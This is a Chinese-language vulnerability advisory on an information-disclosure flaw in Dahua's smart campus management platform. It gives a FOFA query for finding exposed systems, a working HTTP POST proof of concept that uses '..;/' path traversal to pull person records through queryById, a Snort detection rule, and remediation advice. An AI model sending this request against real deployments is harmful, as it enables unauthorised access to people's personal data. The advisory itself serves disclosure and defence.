# 大华-智慧园区综合管理平台queryById存在信息泄露漏洞

大华-智慧园区综合管理平台queryById存在信息泄露漏洞

# 影响版本

大华-智慧园区综合管理平台

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  app="dahua-智慧园区综合管理平台"

**POC/EXP：**

**step1** 

```
POST /CardSolution/card/visitor/appointment/..;/..;/..;/card/person/queryById HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip
Connection: keep-alive
Content-Length: 9
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15

{"id":8}
```

​![image](assets/image-20260827005240-9yesofo.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"大华-智慧园区综合管理平台 - /card/person/queryById 信息泄露漏洞 (路径遍历绕过)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/card/person/queryById"; fast_pattern;
    http.uri; content:"..;"; distance:0;
    http.content_type; content:"application/json";
    http.request_body; content:"\"id\""; nocase;
    metadata:
        service http,
        affected_product "大华-智慧园区综合管理平台",
        vulnerability_type "Information Disclosure via Path Traversal",
        severity "high";
    classtype:web-application-attack;
    sid:1000736;
    rev:1;
    priority:2;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。

‍
